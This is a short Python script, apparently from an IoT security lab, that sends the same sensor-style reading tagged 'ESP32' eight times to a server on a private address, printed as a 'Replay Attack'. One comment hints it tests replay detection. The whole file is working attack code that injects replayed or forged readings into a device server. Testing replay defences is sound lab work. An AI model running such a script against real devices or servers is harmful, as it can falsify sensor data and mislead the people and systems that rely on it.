import socket
import time

HOST = "10.194.116.77"
PORT = 5000

payload = "27.5,1600,45,ESP32"

print("[*] Starting Replay Attack...")

for i in range(8):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))
        s.send(payload.encode())

        try:
            response = s.recv(1024).decode().strip()
            print(f"[{i+1}] Response: {response}")
        except:
            pass

        s.close()
        time.sleep(0.7)   # faster repeat for replay detection
    except Exception as e:
        print("Error:", e)

print("[*] Replay Attack Finished")